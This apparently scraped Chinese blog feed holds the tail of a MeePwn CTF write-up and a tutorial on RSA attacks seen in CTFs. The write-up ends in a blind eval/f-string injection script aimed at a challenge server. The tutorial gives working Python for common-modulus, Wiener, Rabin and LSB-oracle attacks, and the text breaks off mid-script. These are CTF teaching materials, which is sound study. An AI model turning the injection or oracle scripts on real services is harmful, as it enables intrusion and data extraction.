解题脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import requests, re def calc(v1, v2, op, s): u = \u0026#34;http://206.189.223.3/cgi-bin/server.py?\u0026#34; payload = dict(value1=v1, value2=v2, op=op, source=s) r = requests.get(u, params=payload) res = re.findall(\u0026#34;\u0026lt;pre\u0026gt;\\n\u0026gt;\u0026gt;\u0026gt;\u0026gt;([\\s\\S]*)\\n\u0026gt;\u0026gt;\u0026gt; \u0026lt;\\/pre\u0026gt;\u0026#34;, r.content)[0].split(\u0026#39;\\n\u0026#39;)[1] return res == \u0026#39;Invalid\u0026#39; def check(mid): s = flag + chr(mid) return calc(v1, v2, op, s) def bin_search(seq=xrange(0x20, 0x80), lo=0, hi=None): assert (lo \u0026gt;= 0) if hi == None: hi = len(seq) while lo \u0026lt; hi: mid = (lo + hi) // 2 if check(seq[mid]): hi = mid else: lo = mid + 1 return seq[lo] flag = \u0026#39;\u0026#39; v1, op, v2, s = \u0026#39;T\u0026#39;, \u0026#34;+f\u0026#34;, \u0026#34;ru{FLAG\u0026lt;source or 14:x}\u0026#34;, \u0026#39;a\u0026#39; while (1): flag += chr(bin_search() - 1) print flag # MeePwnCTF{python3.6[_strikes_backkkkkkkkkkkk)} ","permalink":"https://ret2neo.cn/post/180719meepwn_py3inject/","summary":"本文首发 先知社区 ，转载请注明链接。\nPyCalx This code is supposed to be unexploitable :/ another pyjail? [Source] Try this or this Notice: The flag may contain non alphabetic characters (but still printable)\n本题由Python的 eval() 函数参数可控且直接拼接引发的注入，采用二分法盲注。\nserver.py源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 #!","title":"Meepwn2018：PyCalx\u0026PyCalx2——Python3的f-string与eval注入"},{"content":"本文首发先知社区 ，转载请注明链接。\nCTF中常见的RSA相关问题总结 前言 ​理解基本概念后，代码就可以说明一切，所以本文将每种攻击方式的实现方法都提炼成了一个函数，在理解原理时会有帮助，在需要时也可以直接调用。\n基础 RSA概要 在开始前可以通过 《RSA算法详解》 这篇文章了解关于RSA的基础知识，包括加解密方法，算法原理和可行性证明等。\n应用流程 选取两个较大的互不相等的质数p和q，计算n = p * q 。 计算phi = (p-1) * (q-1) 。 选取任意e，使得e满足 1\u0026lt;e\u0026lt;phi 且 gcd(e , phi) == 1 。 计算e关于 phi 的模逆元d， 即d满足(e * d)% phi ==1 。 加解密：c = (m ^ e) % n ， m = (c ^ d) % n 。其中m为明文，c为密文，(n,e)为公钥对，d为私钥，要求 0 \u0026lt;= m \u0026lt; n 。 理解模逆运算 如果 (a*b)%c==1 ，那么a和b互为对方模c的模逆元/数论倒数，也写作 。\n关于最大公约数有一个基本事实：给予两整数a、c，必存在整数x、y使得ax + cy = gcd(a,c) ，基于这个事实，当a,c互素即gcd(a,c)==1 时，有ax+cy=1 ，那么就有(a*x)%c==1 ，所以x就是a 对c的模逆元。因此，a对c存在模逆元b的充要条件是gcd(a,c)==1 。显然对于每一组a,c ，存在一族满足条件的x，在求模逆元时我们取得是最小正整数解x mod n 。\n上述的基本事实很容易理解，因为a和c的最大公约数是gcd(a,b)，所以a和c都可表示为gcd(a,b)的整数倍，那么a和b的任意整系数的线性组合ax+by也必定能表示成gcd(a,c)的整数倍，他们当中最小的正整数就应该是gcd(a,c)。实际上最大公约数有一个定义就是：a和b的最大公约数g是a和b的线性和中的最小正整数 。\n求模逆元主要基于扩展欧几里得算法，贴一个Python实现：\n1 2 3 4 5 6 7 8 9 def egcd ( a , b ): if (b == 0): return 1, 0, a else: x , y , q = egcd( b , a % b ) # q = GCD(a, b) = GCD(b, a%b) x , y = y, ( x - (a // b) * y ) return x, y, q def mod_inv(a,b): return egcd(a,b)[0]%b #求a模b得逆元 求模逆也可直接利用gmpy2库。如 import gmpy2;print gmpy2.invert(47,30) 可求得47模30的逆为23。\n模意义下的运算法则 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 (a + b) % n ≡ (a % n + b % n) % n (a - b) % n ≡ (a % n - b % n) % n (a * b) % n ≡ (a % n * b % n) % n (a ^ b) % n ≡ ((a % n) ^ b) % n //幂运算 若 a ≡ b(mod n) ,则 1.对于任意正整数c,有a^c ≡ b^c(mod n) 2.对于任意整数c,有ac ≡ bc(mod n),a+c ≡ b+c(mod n), 3.若 c ≡ d(mod n),则a-c ≡ b-d(mod n),a+c ≡ b+d(mod n),ac ≡ bd(mod n) 如果ac≡bc (mod m)，且c和m互质，则a≡b (mod m）。 [理解：当且仅当c和m互质,c^-1存在,等式左右可同乘模逆。] 除法规则： 在模n意义下，a/b不再仅仅代表这两个数相除，而是指 a+k1*n 和 b+k2*n这两个组数中任意两个相除，使商为整数 因此也就可以理解，除以一个数等价于乘以它的逆 a/b ≡ c(mod n) \u0026lt;=\u0026gt; a ≡ c*(b^-1) (mod n)，其中b模n的逆记作b的负一次方。 费马小定理: a是整数,p是质数,则a^p==a(mod p),如果a不是p的倍数,还有a^(p-1) ≡ 1(mod p)\t推荐文章 模运算总结 和 取模运算涉及的算法 。\n欧几里得算法 欧几里得算法是求最大公约数的算法, 也就是中学学的 辗转相除法 。记 gcd(a,b) 为a和b的最大公约数，欧几里得算法的基本原理是gcd(a,b)==gcd(b,a%b),(b!=0) 和 gcd(a,0)==a 。\nPython实现如下：\n1 2 3 4 5 6 7 8 9 # 递归版 def gcd(a, b): return a if not b else gcd(b, a % b) # 迭代版 def gcd2(a, b): while b: a, b = b, a % b return a 扩展欧几里得算法 扩展欧几里得算法基于欧几里得算法，能够求出使得 ax+by=gcd(a,b) 的一组x,y。\n这篇文章 解释得很到位，对照下图和以下递归版实现容易理解。\nPython实现如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # 递归版 def ext_euclid ( a , b ): # ref:https://zh.wikipedia.org/wiki/扩展欧几里得算法 if (b == 0): return 1, 0, a else: x1 , y1 , q = ext_euclid( b , a % b ) # q = GCD(a, b) = GCD(b, a%b) x , y = y1, ( x1 - (a // b) * y1 ) return x, y, q # 迭代版 def egcd(a, b): # ref:https://blog.csdn.net/wyf12138/article/details/60476773 if b == 0: return (1, 0, a) x, y = 0, 1 s1, s2 = 1, 0 r, q = a % b, a / b while r: m, n = x, y x = s1 - x * q y = s2 - y * q s1, s2 = m, n a, b = b, r r, q = a % b, a / b return (x, y, b) 中国剩余定理 维基百科 给出了简洁生动的说明:\n参考以上说明进行的Python实现:\n1 2 3 4 5 6 7 8 9 10 11 def CRT(mi, ai): # mi,ai分别表示模数和取模后的值,都为列表结构 # Chinese Remainder Theorem # lcm=lambda x , y:x*y/gcd(x,y) # mul=lambda x , y:x*y # assert(reduce(mul,mi)==reduce(lcm,mi)) # 以上可用于保证mi两两互质 assert (isinstance(mi, list) and isinstance(ai, list)) M = reduce(lambda x, y: x * y, mi) ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) for (m, a) in zip(mi, ai)] return reduce(lambda x, y: x + y, ai_ti_Mi) % M 以上程序将mi当作两两互质处理,实际上有时会遇到其他情况，这时就需要逐一两两合并方程组。我参照下图实现了一个互质与不互质两种情况下都能工作良好的中国剩余定理（解同余方程组）的Python程序。\n1 2 3 4 5 6 7 8 9 10 11 12 13 def GCRT(mi, ai): # mi,ai分别表示模数和取模后的值,都为列表结构 assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) #不成立则不存在解 K = c / d * gmpy2.invert(curm / d, m / d) cura += curm * K curm = curm * m / d cura %= curm return (cura % curm, curm) #(解,最小公倍数) 图片截自 中国剩余定理（互质与不互质的情况） 。\n常见攻击方式实践 准备工具 python gmpy2库 Windows：可从https://pypi.org/project/gmpy2/#files 直接下载已编译的安装包。 Linux： sudo apt install python-gmpy2 libnum库： git clone https://github.com/hellman/libnum.git \u0026amp;\u0026amp; cd libnum \u0026amp;\u0026amp; python setup.py install yafu https://sourceforge.net/projects/yafu/ RSATool2v17.exe RSA解密 若已知私钥d，则可以直接解密： m=pow(c,d,n) 。\n若已知质数p和q，则通过依次计算欧拉函数值phi、私钥d可解密。简易实现如下：\n1 2 3 4 5 6 7 8 9 def rsa_decrypt(e, c, p, q): phi = (p - 1) * (q - 1) n = p * q try: d = gmpy2.invert(e, phi) #求e模phi的逆 return pow(c, d, n) except Exception as e: print \u0026#34;e and phi are not coprime!\u0026#34; raise e 在选取加密指数e时要求phi，e互质，也就是gcd(phi,e)==1 ，如果不满足是无法直接解密的。\n为什么说这个呢？是因为有时会有乍一看有点奇怪的情况。比如SCTF2018的 Crypto - a number problem ，题目是\n1 2 x**33=1926041757553905692219721422025224638913707 mod 3436415358139016629092568198745009225773259 tell me the smallest answer of x 其中n=3436415358139016629092568198745009225773259 可以直接分解得到p,q，出phi=(p-1)*(q-1) ，然后惊奇地发现gcd(phi,33)==3 。这时如果对加密过程比较熟悉的话，就可以想到实际上公钥e=11 ，明文是m=x^3 ，应该先求出m。然后再爆破x。\n1 2 3 4 5 6 for i in range(1000000): # 推荐使用gmpy2库运算，用pow开立方不可行 if gmpy2.iroot(m + i * n, 3)[1]: x = gmpy2.iroot(m + i * n, 3)[0] # i==243277,x==9420391510958023 break 查询已知的n的可分解情况 在线查询：https://factordb.com/\napi接口：\n1 2 3 curl http://factordb.com/api?query=12345 response: {\u0026#34;id\u0026#34;:\u0026#34;12345\u0026#34;,\u0026#34;status\u0026#34;:\u0026#34;FF\u0026#34;,\u0026#34;factors\u0026#34;:[[\u0026#34;3\u0026#34;,1],[\u0026#34;5\u0026#34;,1],[\u0026#34;823\u0026#34;,1]]} 使用yafu分解N 适用情况：p,q相差较大或较小时可快速分解。\n使用方法： yafu-x64.exe factor(233) ，yafu-x64.exe help\n模不互素\t（gcd(N1,N2)!=1） 适用情况：存在两个或更多模数 ，且gcd(N1,N2)!=1 。\n多个模数n共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一gcd(N1,N2) ，然后这个最大公约数可用于分解模数分别得到对应的p和q，即可进行解密。实现参照本文欧几里得算法 部分和RSA解密 部分。\n共模攻击 适用情况：明文m、模数n相同，公钥指数e、密文c不同，gcd(e1,e2)==1\n对同一明文的多次加密使用相同的模数和不同的公钥指数可能导致共模攻击。简单证明见代码注释。\nPython实现：\n1 2 3 4 5 6 7 8 9 10 11 12 def common_modulus(n, e1, e2, c1, c2): \u0026#34;\u0026#34;\u0026#34; ref: https://crypto.stackexchange.com/questions/16283/how-to-use-common-modulus-attack ∵gcd(e1,e2)==1,∴由扩展欧几里得算法，存在e1*s1+e2*s2==1 ∴m==m^1==m^(e1*s1+e2*s2)==((m^e1)^s1)*((m^e2)^s2)==(c1^s1)*(c2^s2) \u0026#34;\u0026#34;\u0026#34; assert (libnum.gcd(e1, e2) == 1) _, s1, s2 = gmpy2.gcdext(e1, e2) # 若s1\u0026lt;0，则c1^s1==(c1^-1)^(-s1)，其中c1^-1为c1模n的逆元。 m = pow(c1, s1, n) if s1 \u0026gt; 0 else pow(gmpy2.invert(c1, n), -s1, n) m *= pow(c2, s2, n) if s2 \u0026gt; 0 else pow(gmpy2.invert(c2, n), -s2, n) return m % n 例子：QCTF2018-XMan选拔赛 / Xman-RSA 【共模攻击+模不互素】 这道题利用了共模攻击和模不互素。刚开始是一个字符替换，与本文无关。encryption.encrypted文件被做了字符替换，根据语法确定替换表，修复文件得到源文件如下。\n题目附件见文末链接。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 from gmpy2 import is_prime from os import urandom import base64 def bytes_to_num(b): return int(b.encode(\u0026#39;hex\u0026#39;), 16) def num_to_bytes(n): b = hex(n)[2:-1] b = \u0026#39;0\u0026#39; + b if len(b) % 2 == 1 else b return b.decode(\u0026#39;hex\u0026#39;) def get_a_prime(l): random_seed = urandom(l) num = bytes_to_num(random_seed) while True: if is_prime(num): break num += 1 return num def encrypt(s, e, n): p = bytes_to_num(s) p = pow(p, e, n) return num_to_bytes(p).encode(\u0026#39;hex\u0026#39;) def separate(n): p = n % 4 t = (p * p) % 4 return t == 1 f = open(\u0026#39;flag.txt\u0026#39;, \u0026#39;r\u0026#39;) flag = f.read() msg1 = \u0026#34;\u0026#34; msg2 = \u0026#34;\u0026#34; for i in range(len(flag)): if separate(i): msg2 += flag[i] else: msg1 += flag[i] p1 = get_a_prime(128) p2 = get_a_prime(128) p3 = get_a_prime(128) n1 = p1 * p2 n2 = p1 * p3 e = 0x1001 c1 = encrypt(msg1, e, n1) c2 = encrypt(msg2, e, n2) print(c1) print(c2) e1 = 0x1001 e2 = 0x101 p4 = get_a_prime(128) p5 = get_a_prime(128) n3 = p4 * p5 c1 = num_to_bytes(pow(n1, e1, n3)).encode(\u0026#39;hex\u0026#39;) c2 = num_to_bytes(pow(n1, e2, n3)).encode(\u0026#39;hex\u0026#39;) print(c1) print(c2) print(base64.b64encode(num_to_bytes(n2))) print(base64.b64encode(num_to_bytes(n3))) n2，n3已知，利用共模攻击得到n1，由gcd(n1,n2)==p1 分解n1，n2，就可解密得到两部分msg，拼接即可。\n解题脚本如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 # -*- coding: utf-8 -*- # by https://findneo.github.io/ import base64 import libnum import gmpy2 def fix_py(): # decode encryption.encrypted s1 = \u0026#39;abdefghijklmpqrtuvwxyz\u0026#39; s2 = \u0026#39;dmenwfoxgpyhirasbktclu\u0026#39; f1 = open(\u0026#39;encryption.encrypted\u0026#39;) with open(\u0026#39;encryption.py\u0026#39;, \u0026#39;w\u0026#39;) as f2: for i in f1.readlines(): tmp = \u0026#39;\u0026#39; for j in i: tmp += s2[s1.index(j)] if j in s1 else j f2.write(tmp) # fix_py() def common_modulus(n, e1, e2, c1, c2): assert (libnum.gcd(e1, e2) == 1) _, s1, s2 = gmpy2.gcdext(e1, e2) m = pow(c1, s1, n) if s1 \u0026gt; 0 else pow(gmpy2.invert(c1, n), -s1, n) m *= pow(c2, s2, n) if s2 \u0026gt; 0 else pow(gmpy2.invert(c2, n), -s2, n) m %= n return m [n2, n3] = map(lambda x: int(base64.b64decode(x).encode(\u0026#39;hex\u0026#39;), 16), open(\u0026#39;n2\u0026amp;n3\u0026#39;).readlines()) [n1c1, n1c2] = map(lambda x: int(x, 16), open(\u0026#39;n1.encrypted\u0026#39;).readlines()) [msg1c1, msg2c2] = map(lambda x: int(x, 16), open(\u0026#39;ciphertext\u0026#39;).readlines()) # 通过共模攻击得到n1 e1 = 0x1001 e2 = 0x101 n1 = common_modulus(n3, e1, e2, n1c1, n1c2) # n1,n2有一个共有质因数p1 # n1 += n3 # 存在n3比n1小的可能，并且确实如此;貌似主办方中途改题，把n1改成小于n3了。 p1 = gmpy2.gcd(n1, n2) assert (p1 != 1) p2 = n1 / p1 p3 = n2 / p1 e = 0x1001 d1 = gmpy2.invert(e, (p1 - 1) * (p2 - 1)) d2 = gmpy2.invert(e, (p1 - 1) * (p3 - 1)) msg1 = pow(msg1c1, d1, n1) msg2 = pow(msg2c2, d2, n2) msg1 = hex(msg1)[2:].decode(\u0026#39;hex\u0026#39;) msg2 = hex(msg2)[2:].decode(\u0026#39;hex\u0026#39;) print msg1, msg2 # XA{RP0I_0Itrsigi s.y # MNCYT_55_neetnvmrap} # XMAN{CRYPT0_I5_50_Interestingvim rsa.py} 小明文攻击 适用情况：e较小，一般为3。\n公钥e很小，明文m也不大的话，于是m^e=k*n+m 中的的k值很小甚至为0，爆破k或直接开三次方即可。\nPython实现：\n1 2 3 4 5 6 def small_msg(e, n, c): print time.asctime(), \u0026#34;Let\u0026#39;s waiting...\u0026#34; for k in xrange(200000000): if gmpy2.iroot(c + n * k, e)[1] == 1: print time.asctime(), \u0026#34;...done!\u0026#34; return gmpy2.iroot(c + n * k, 3)[0] 例子：Extremely hard RSA 题目提供的n是4096位的，e=3。\n1 2 3 4 5 6 7 8 9 10 11 12 13 import gmpy2,binascii,libnum,time n=0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 e=3 res=0 c=int(open(\u0026#39;extremelyhardRSA.rar/flag.enc\u0026#39;,\u0026#39;rb\u0026#39;).read().encode(\u0026#39;hex\u0026#39;),16) print time.asctime() for i in xrange(200000000): if gmpy2.iroot(c+n*i,3)[1]==1: res=gmpy2.iroot(c+n*i,3)[0] print i,res print libnum.n2s(res) print time.asctime() break Rabin加密中的N可被分解 适用情况：e==2\nRabin加密是RSA的衍生算法，e==2是Rabin加密典型特征，可以百度或阅读 https://en.wikipedia.org/wiki/Rabin_cryptosystem 以了解到详细的说明，这里只关注解密方法。一般先通过其他方法分解得到p，q，然后解密。\nPython实现：\n1 2 3 4 5 6 7 8 9 10 11 def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) / 4, p) mq = pow(c, (q + 1) / 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) 函数返回四个数，这其中只有一个是我们想要的明文，需要通过其他方式验证，当然CTF中显然就是flag字眼了。\n解密方法是参照维基百科的，截图如下：\n例子：Jarvis OJ hard RSA 解题脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import gmpy2,libnum n=0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD p=275127860351348928173285174381581152299 q=319576316814478949870590164193048041239 e=2 c=int(open(\u0026#39;hardRSA.rar/flag.enc\u0026#39;,\u0026#39;rb\u0026#39;).read().encode(\u0026#39;hex\u0026#39;),16) mp=pow(c,(p+1)/4,p) mq=pow(c,(q+1)/4,q) yp=gmpy2.invert(p,q) yq=gmpy2.invert(q,p) r=(yp*p*mq+yq*q*mp)%n rr=n-r s=(yp*p*mq-yq*q*mp)%n ss=n-s print libnum.n2s(r) print libnum.n2s(rr) print libnum.n2s(s) print libnum.n2s(ss) Wiener\u0026rsquo;s Attack 适用情况：e过大或过小。\n工具：https://github.com/pablocelayes/rsa-wiener-attack\n在e过大或过小的情况下，可使用算法从e中快速推断出d的值。详细的算法原理可以阅读：低解密指数攻击 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from Crypto.PublicKey import RSA import ContinuedFractions, Arithmetic def wiener_hack(e, n): # firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git ! frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k, d) in convergents: if k != 0 and (e * d - 1) % k == 0: phi = (e * d - 1) // k s = n - phi + 1 discr = s * s - 4 * n if (discr \u0026gt;= 0): t = Arithmetic.is_perfect_square(discr) if t != -1 and (s + t) % 2 == 0: print(\u0026#34;Hacked!\u0026#34;) return d return False 例子：2018强网杯nextrsa-Level2 1 2 3 4 n = 0x92411fa0c93c1b27f89e436d8c4698bcf554938396803a5b62bd10c9bfcbf85a483bd87bb2d6a8dc00c32d8a7caf30d8899d90cb8f5838cae95f7ff5358847db1244006c140edfcc36adbdcaa16cd27432b4d50d2348b5c15c209364d7914ef50425e4c3da07612cc34e9b93b98d394b43f3eb0a5a806c70f06697b6189606eb9707104a7b6ff059011bac957e2aae9ec406a4ff8f8062400d2312a207a9e018f4b4e961c943dfc410a26828d2e88b24e4100162228a5bbf0824cf2f1c8e7b915efa385efeb505a9746e5d19967766618007ddf0d99525e9a41997217484d64c6a879d762098b9807bee46a219be76941b9ff31465463981e230eecec69691d1L e = 0x6f6b385dd0f06043c20a7d8e5920802265e1baab9d692e7c20b69391cc5635dbcaae59726ec5882f168b3a292bd52c976533d3ad498b7f561c3dc01a76597e47cfe60614f247551b3dbe200e2196eaa001a1d183886eeacddfe82d80b38aea24de1a337177683ed802942827ce4d28e20efef92f38f1b1a18c66f9b45f5148cceabfd736de8ac4a49e63a8d35a83b664f9f3b00f822b6f11ff13257ee6e0c00ca5c98e661ea594a9e66f2bd56b33d9a13f5c997e67a37fcf9a0c7f04d119fe1ba261127357e64a4b069aefed3049c1c1fe4f964fd078b88bedd064abea385cfebd65e563f93c12d34eb6426e8aa321033cfd8fe8855b9e74d07fe4f9d70de46fL d = wiener_hack(e, n) print d #42043 私钥文件修复 适用情况：提供破损的私钥文件。\n例子：Jarvis OJ-God Like RSA 参考 https://www.40huo.cn/blog/rsa-private-key-recovery-and-oaep.html 修复存储私钥的文件，得到p和q。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import gmpy2,binascii,libnum,time from Crypto.PublicKey import RSA with open(\u0026#39;godlikeRSA.rar/pubkey.pem\u0026#39;, \u0026#39;r\u0026#39;) as f: key = RSA.importKey(f) n = key.n e = key.e p = 30061432003658510087798871614869318011389940352798147030129806359975911392091235344042288409629143229311060231549478211871643725394470760528211801310601767727834886942210718412087541234398453046895030858579989874035849439867334906873642352112428914855967993998732685221108379784833027771293275558876952608462050146340591449046825135890871650866799299533696175818103240024841274114925018619060818213433528894936128306780366785977567327073724428211445259983614467640785163297734447975723664659822673456683284394386723716344090232882990461174301609971805075768328757325956784604364401827152431260896927633163074694121679 q = 26136662545551829820746942051638228325025130519175536694008242208616774469870765684858288042819063837180243501117310278632509413217676559484513481677689042623348188876598901642459170232360966754692434316796014314498263800234390539118817050074978421973817764644287745302885861277447227180288605200894138168586207384484170481511828680117688324729381172912436910052489279406590356734739774635376711681212908417321705094537960645308009611045658947359297373154395500467689532455017647450616447445444254910371922944620114234547655209970657063715028350418518417105772707885648587233103869340985670430269862943630137067052883 print n==p*q phi=(p-1)*(q-1) d=gmpy2.invert(e,phi) print e*d%phi c=int(open(\u0026#39;godlikeRSA.rar/flag.enc\u0026#39;,\u0026#39;rb\u0026#39;).read().encode(\u0026#39;hex\u0026#39;),16) m=pow(c,d,n) print m # 1370223550024951160390505387130177939237950112048472397389773634788136940247048803373180904499220116137720016277614401463947529601059601275191225565163007356175594695217230371190488219356030961008234353281422568670237109241798409859772276203338663213736672988507101836099731545753186306605979236795416523018072994981230167509019379957053839561135207769133885837247551721998502691458955042383536845772871317832519566606644011038158531192089650858814552702073939336587081668849526410118259284356539710136294431275218448114094635426857980426460905608258535404240097392254948848433684475139365021846569436926295331904560877283857331146381104141185386272078892946248648795223866902960499271054375730866146508724739787771837579817109380817612386428775429383894697178101165350212843220568133053034913426083965937819287414427916848075303046293039426388342757953620799736182799948741710617974079729792088434776370340095313622264898772452440870247810948774919910578850614282925852564445288646487485017449052934955175051072066751519784123645584671119185023928739438748519535869994754998423784897445884244844154563303115861175492133906368196005147361767160830004522010287149025190543608485818909441439294996482797249312140402141744752129890112 # 明文是这个，flag是啥不知道 LSB Oracle Attack 适用情况：可以选择密文并泄露最低位。\n在一次RSA加密中，明文为m，模数为n，加密指数为e，密文为c。我们可以构造出c'=((2^e)*c)%n=((2^e)*(m^e))%n=((2*m)^e)%n ， 因为m的两倍可能大于n，所以经过解密得到的明文是 m'=(2*m)%n 。我们还能够知道 m' 的最低位lsb 是1还是0。 因为n是奇数，而2*m 是偶数，所以如果lsb 是0，说明(2*m)%n 是偶数，没有超过n，即m\u0026lt;n/2.0 ，反之则m\u0026gt;n/2.0 。举个例子就能明白2%3=2 是偶数，而4%3=1 是奇数。以此类推，构造密文c\u0026quot;=(4^e)*c)%n 使其解密后为m\u0026quot;=(4*m)%n ，判断m\u0026quot; 的奇偶性可以知道m 和 n/4 的大小关系。所以我们就有了一个二分算法，可以在对数时间内将m的范围逼近到一个足够狭窄的空间。\n更多信息可参考：RSA Least-Significant-Bit Oracle Attack 和 RSA least significant bit oracle attack 。\nPython实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import decimal def oracle(): return lsb == \u0026#39;odd\u0026#39; def partial(c, e, n): k = n.bit_length() decimal.getcontext().prec = k # for \u0026#39;precise enough\u0026#39; floats lo = decimal.Decimal(0) hi = decimal.Decimal(n) for i in range(k): if not oracle(c): hi = (lo + hi) / 2 else: lo = (lo + hi) / 2 c = (c * pow(2, e, n)) % n # print i, int(hi - lo) return int(hi) 例子：QCTF2018-XMan选拔赛/Baby RSA 题目如下\n1 2 3 4 5 6 7 8 9 10 11 e = 0x10001 n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db c = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0 λ nc 47.96.239.28 23333 ----------------------------- baby rsa ----------------------------- Come and Decode your data If you give me ciphertext, I can tell you whether decoded data is even or odd You can input ciphertext(hexdecimal) now 1 odd 解题脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 # -*- coding: utf-8 -*- # by https://findneo.github.io/ # ref: # https://crypto.stackexchange.com/questions/11053/rsa-least-significant-bit-oracle-attack # https://ctf.rip/sharif-ctf-2016-lsb-oracle-crypto-challenge/ # https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/ import libnum, gmpy2, socket, time, decimal def oracle(c1): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) hostname = \u0026#39;47.96.239.28\u0026#39; port = 23333 s.connect((hostname, port)) s.recv(1024) s.send(hex(c1)[2:].strip(\u0026#34;lL\u0026#34;) + \u0026#39;\\n\u0026#39;) res = s.recv(1024).strip() s.close() if res == \u0026#39;even\u0026#39;: return 0 if res == \u0026#39;odd\u0026#39;: return 1 else: assert (0) def partial(c, n): global c_of_2 k = n.bit_length() decimal.getcontext().prec = k # allows for \u0026#39;precise enough\u0026#39; floats lower = decimal.Decimal(0) upper = decimal.Decimal(n) for i in range(k): possible_plaintext = (lower + upper) / 2 # lower==0 when i\u0026lt;1809 flag = oracle(c) if not flag: upper = possible_plaintext # plaintext is in the lower half else: lower = possible_plaintext # plaintext is in the upper half c = (c * c_of_2) % n # multiply y by the encryption of 2 again print i, flag, int(upper - lower) # time.sleep(0.2) # By now, our plaintext is revealed! return int(upper) def main(): print \u0026#34;[*] Conducting Oracle attack...\u0026#34; return partial((c * c_of_2) % n, n) if __name__ == \u0026#39;__main__\u0026#39;: e = 0x10001 n = 